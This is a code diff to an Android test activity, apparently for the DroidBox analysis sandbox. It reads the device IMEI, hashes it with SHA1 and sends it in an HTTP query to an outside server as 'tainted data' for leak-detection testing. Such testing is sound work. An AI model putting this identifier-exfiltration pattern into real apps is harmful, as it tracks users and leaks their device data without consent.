@@ -14,6 +14,8 @@ import android.util.Log;
 
 public class DroidBoxTests extends Activity {
 	
+	private String imei, hashedImei;
+	
     /** 
      * Called when the activity is first created. 
      */
@@ -21,9 +23,17 @@ public class DroidBoxTests extends Activity {
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);   
         setContentView(R.layout.main);
+        // Setup test variables
+        this.setupTest();
         // Run tests
         this.testCryptHash();
         this.testNetworkHTTP();
+    }
+    
+    public void setupTest() {
+    	// IMEI
+        TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
+        imei = manager.getDeviceId();
     }
     
     /**
@@ -32,19 +42,35 @@ public class DroidBoxTests extends Activity {
     public void testCryptHash() {
     	Log.v("Test", "[*] testCryptHash()");
     	String testStr = "Hash me";
-    	@SuppressWarnings("unused")
-		byte messageDigest[];
+    	byte messageDigest[];
     	MessageDigest digest = null;
         try {
             // MD5
             digest = java.security.MessageDigest.getInstance("MD5");
             digest.update(testStr.getBytes());
             messageDigest = digest.digest();
+            digest.digest(testStr.getBytes());
             
             // SHA1
             digest = java.security.MessageDigest.getInstance("SHA1");
             digest.update(testStr.getBytes());
             messageDigest = digest.digest();
+            
+            // Hash tainted data
+            digest = null;
+            digest = java.security.MessageDigest.getInstance("SHA1");
+            digest.update(imei.getBytes());
+            messageDigest = digest.digest();
+            
+            // Create Hex String
+            StringBuffer hexString = new StringBuffer();
+            for (int i = 0; i < messageDigest.length; i++) {
+                String h = Integer.toHexString(0xFF & messageDigest[i]);
+                while (h.length() < 2)
+                    h = "0" + h;
+                hexString.append(h);
+            }
+            hashedImei = hexString.toString();
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         }
@@ -58,8 +84,6 @@ public class DroidBoxTests extends Activity {
     	// HttpURLConnection read & write
         URL url =  null;
         HttpURLConnection urlConnection = null;
-        TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
-        String imei = manager.getDeviceId();
     	try {
             url = new URL("http://code.google.com/p/droidbox/");
             urlConnection = (HttpURLConnection) url.openConnection();
@@ -68,7 +92,9 @@ public class DroidBoxTests extends Activity {
             @SuppressWarnings("unused")
             String line = "";
             while ((line = rd.readLine()) != null);
-            url = new URL("http://pjlantz.com/imei.php?imei=" + imei);
+            
+            // HttpURLConnection sending tainted data
+            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
             while ((line = rd.readLine()) != null);
